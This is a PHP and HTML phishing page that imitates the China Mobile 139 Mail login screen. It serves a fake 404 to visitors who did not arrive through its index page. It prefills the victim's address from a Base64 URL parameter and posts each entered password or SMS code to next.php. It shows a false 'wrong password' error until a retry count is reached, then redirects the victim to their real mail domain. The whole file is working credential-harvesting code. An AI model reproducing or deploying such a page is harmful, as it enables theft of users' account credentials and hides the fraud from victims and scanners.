<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>中国移动139邮箱-手机号就是邮箱号</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="mainc139" style="height: 100vh;">
        <div id="navb139" style="height: 60px;background: rgba(255,255,255,0.51);padding-top: 13px;padding-bottom: 13px;padding-left: 16px;padding-right: 16px;"><img class="img-fluid" width="116" height="28" src="../assets/img/139.png"></div>
        <div id="maino139" class="c-div" style="height: 460px;">
            <div id="maini139" class="e-div" style="width: 100%;max-width: 1024px;">
                <div id="fo263" style="width: 100%;max-width: 340px;background: #ffffff;margin-top: 70px;height: fit-content;">
                    <div class="sp-div" style="height: 50px;border-bottom: 1px solid rgb(187,187,187) ;">
                        <div style="width: 50%;background: #ffffff;">
                            <p class="fw-bold" style="text-align: center;margin-top: 20px;color: rgb(16,99,222);font-size: 16px;text-decoration: underline;">短信验证</p>
                        </div>
                        <div style="width: 50%;background: #ffffff;border-left-width: 1px;border-left-color: rgb(179,179,179);">
                            <p style="text-align: center;margin-top: 20px;color: rgb(16,99,222);font-size: 16px;text-decoration: underline;font-weight: bold;">&nbsp; 账号密码</p>
                        </div>
                    </div>
                    <div style="padding: 0px 28px 26px;"><input type="text" id="backEMF" style="width: 100%;height: 40px;margin-top: 32px;padding: 1px 8px;font-size: 14px;"><input type="password" id="pass" style="width: 100%;height: 40px;margin-top: 16px;padding: 1px 8px;font-size: 14px;" placeholder="短信验证码">
                        <p id="err" style="margin-top: 6px;font-size: 14px;color: rgb(242,15,0);">密码错误，请重试</p>
                        <div class="sp-div" style="margin-top: 16px;font-size: 12px;">
                            <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1"> 保持登录状态</label></div>
                        </div><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;height: 40px;border-radius: 0px;" onclick="nextFun();">登 录 / 注 册</button>
                        <div class="form-check" style="margin-top: 16px;"><input class="form-check-input" type="checkbox" id="formCheck-2"><label class="form-check-label" for="formCheck-2" style="font-size: 14px;">我已阅读并同意&nbsp;<a href="#">用户协议,&nbsp;</a><a href="#">隐私政策</a>&nbsp;</label></div><img class="img-fluid" width="473" height="110" src="../assets/img/139qr.png" style="margin-top: 16px;">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>